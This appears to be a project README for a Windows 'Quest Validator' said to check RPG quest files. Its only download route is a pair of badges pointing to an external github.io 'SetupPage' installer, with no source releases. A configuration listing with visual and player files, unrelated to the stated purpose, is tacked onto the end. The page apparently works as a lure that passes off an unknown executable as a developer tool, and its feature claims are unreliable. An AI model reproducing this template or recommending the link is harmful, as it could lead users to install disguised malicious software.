# Quill‑OnceHuman Quest Validator

**Author:** IntersectScholar
**Platform:** Windows 10 / 11 (desktop only)
**Domain:** Game‑quest‑validation‑utility

---

## 🎯 What is this?

`Quill-OnceHuman-Quest-Validator` is a lightweight Windows‑only utility that scans the quest files of single‑player RPGs built with the **Quill‑OnceHuman** engine. It verifies that every quest:

* Has a valid objective chain
* References existing NPCs, items, and locations
* Awards the correct rewards (experience, items, reputation)
* Is free from circular dependencies and dead‑ends

Think of it as a **data‑integrity guard** for your RPG’s narrative flow, catching errors before they become frustrating bugs for players.

---

## 📦 Quick Start

1. **Download** the latest build from the official page:
   <a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Download-Now-blue?style=for-the-badge" alt="Download"></a>

2. Run the installer (Windows 10/11) and follow the wizard.
3. Launch **Quill‑OnceHuman Quest Validator** from the Start menu.

---

## 🛠️ Features

| ✅ Feature | Description |
|-----------|-------------|
| **Full‑Quest Graph Analysis** | Detects orphaned quests, loops, and unreachable steps. |
| **Automatic Reference Check** | Confirms every NPC, item, and location ID exists in the game’s data tables. |
| **Reward Consistency Validator** | Ensures reward amounts match the quest’s difficulty tier. |
| **Exportable Report** | Generates a human‑readable JSON/HTML summary you can attach to bug trackers. |
| **Live Preview** | Visualize the quest flow as a directed graph right inside the app. |
| **Custom Rule Sets** | Add your own validation scripts via a simple Lua‑based API. |

---

## 🚀 How to Use

1. **Load a Quest Pack** – Click **File → Open** and select the folder containing your `.quest` files.
2. **Select Validation Mode** –
   * **Quick Scan** – Fast, surface‑level checks.
   * **Deep Scan** – Full graph analysis + custom rules.
3. **Run** – Press **Validate**. The progress bar will show real‑time statistics.
4. **Review Results** – Errors appear in the **Issues** pane; double‑click to jump to the offending line.
5. **Export** – Choose **Report → Export** to save a detailed log for your team.

---

## 📚 Documentation

- **User Guide** – `docs/UserGuide.md` (included in the installer)
- **API Reference** – `docs/ApiReference.md` (for custom rule development)
- **FAQ & Troubleshooting** – `docs/FAQ.md`

All docs are also available online on the **GitHub Pages** site linked from the download button.

---

## 🤝 Contributing

We welcome contributions that improve validation coverage or add new rule‑sets.

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/awesome‑check`).
3. Implement your changes and ensure the test suite passes.
4. Submit a Pull Request with a clear description of the improvement.

Please follow the **Windows‑only** policy: any code that depends on non‑Windows APIs will be rejected.

---

## 🧪 Testing

The project ships with a set of automated tests that run on Windows 10/11 CI runners:

```powershell
# Run the full test suite
.\run-tests.ps1
```

Tests cover:

* Parsing of all supported quest file versions
* Detection of circular dependencies
* Validation of reward thresholds

---

## 📜 License

`Quill-OnceHuman-Quest-Validator` is released under the **MIT License** – see the `LICENSE` file for details.

---

## 📞 Support

- **Issues:** Open a ticket in the repository’s *Issues* tab.
- **Discussions:** Join the *Community* forum for tips and best practices.
- **Contact:** `intersectscholar@domain.example`

---

### Get Started Now!

<a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Download%20Now-🛠️-green?style=for-the-badge" alt="Download Now"></a>

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```